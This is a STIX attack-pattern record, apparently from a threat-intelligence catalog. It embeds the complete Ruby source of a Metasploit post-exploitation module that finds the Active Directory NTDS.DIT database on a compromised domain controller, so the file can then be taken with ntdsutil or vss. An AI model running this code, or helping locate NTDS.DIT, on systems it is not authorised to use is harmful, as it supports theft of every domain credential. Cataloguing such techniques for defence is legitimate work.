{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e2f1f026-24ea-444f-8a2b-ff3b000ac63e",
    "created": "2024-08-14T16:33:05.016876Z",
    "modified": "2024-08-14T16:33:05.01688Z",
    "name": "Post Windows Gather NTDS.DIT Location",
    "description": " This module will find the location of the NTDS.DIT file (from the Registry) check that it exists, and display its location on the screen, which is useful if you wish to manually acquire the file using ntdsutil or vss. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/ntds_location.rb",
            "external_id": "ntds_location.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Accounts\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Post Windows Gather NTDS.DIT Location',\n        'Description' => %q{\n          This module will find the location of the NTDS.DIT file (from the Registry),\n          check that it exists, and display its location on the screen, which is useful\n          if you wish to manually acquire the file using ntdsutil or vss.\n        },\n        'Author' => ['Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>'],\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    unless domain_controller?\n      print_error('Host does not appear to be an AD Domain Controller')\n      return\n    end\n\n    # Find the location of NTDS.DIT in the Registry\n    ntds = registry_getvaldata('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\NTDS\\\\Parameters', 'DSA Database file')\n\n    unless ntds\n      print_error('Unable to find the location of NTDS.DIT')\n      return\n    end\n\n    if file?(ntds)\n      f = client.fs.file.stat(ntds)\n      print_line(\"NTDS.DIT is located at: #{ntds}\")\n      print_line(\"      Size: #{f.size} bytes\")\n      print_line(\"   Created: #{f.ctime}\")\n      print_line(\"  Modified: #{f.mtime}\")\n      print_line(\"  Accessed: #{f.atime}\")\n    else\n      print_error(\"NTDS.DIT is reportedly located at `#{ntds}', but the file does not appear to exist\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}